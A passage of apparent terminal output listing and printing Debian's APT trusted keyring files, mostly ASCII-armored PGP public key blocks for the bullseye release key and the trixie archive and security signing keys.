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
e18slw8=
=7Dni
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 11861 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-trixie-automatic.asc
-----BEGIN PGP PUBLIC KEY BLOCK-----
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
JTBXMe98MDmvUA==
=OEKh
-----END PGP PUBLIC KEY BLOCK-----
-rw-r--r-- 1 root root 11873 Apr  9  2025 /etc/apt/trusted.gpg.d/debian-archive-trixie-security-automatic.asc
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQINBGfpPl0BEACyof6b+LAkxSHiTZc0RAjilNtshxhqOSr5hrApjAdyLDnUWMf4
mp/UytFKHCbzU9H9QkYXLyr2mCltknX5+A28iYHZzS0eX5XMAmaWdqvd4IkAb/Sw
5k3hFSyFTf0DUW1G8O2AwTwtsC0sX+jDyCzt+zBp2ARnasnm+3gZ85iBmmWkrZf+
HDljanl/BHRE5JzX7Y8S/B72NHV7++m2dqCjsEkWZDH9hyI08cybz/Kjs5wBnVuj
1MqlStKu8kDP/rR8c3KaehwFC4piThZsFe/0SgtieLy+BvLs7bYRdO6SC589sPK5
5/yGmh5NHenVOafTC029p5ZdF7KMPJnmGo5hIqQ1ONBDtVzPQkNO3zlGs+auEN1R
m0PGrRKd4LYbuJVikn7Xo0ZhrOnoczGEfmKAQmRVfWuSoXwH/Xn2DwESTXwx1ruH
uXcY0hiGdmfWVwJgiBa+Phm1Fj52ARvzcsIPM6Ib+nigzcSoXax3QrhPazVUaPn7
PPy0ZEe/qKN31qOP1iCKfrc4VuykhEap9ZcN7HBwqcmAUBImnWp5kJH4KeDhg4Nf
UKuREmPF1pyBzVXHQLi3eBQq+/G3fjJpVKOmUjz/6uURgncWeD49RITaeaX2Hgh5
qpBXO95IGjp7+nkD6/CR9fjZ3W7DAC193Hw1VCX+8zrCC9TZ31pxawYeewARAQAB
iQJOBB8BCgA4FiEEXgSh4yI6GaIHBuIPmQRhPUzOaMYFAmfpPmEXDIABgOl28UpQ
ikjpyj/pvDciUsoc+WQCBwAACgkQmQRhPUzOaMb0bBAAlyO747DrgM2oaf5bTBzn
lG138521Pgkc5QtzpwNZw0n2HnJx5KRQBbrr59VaGCFntrW6mueNS8Wz86PypPUl
5OZpGk/Wo15x5UNkvlMgp0V/8SK3m/6/EyPkuhX9/cb0MiN9svbDzYXR4N+bgFnk
iVICWk92P93Tik7f93IQ40TzAlYcjDYKjo019x+pGS5VYw0cIGjtsNijawiGDIyS
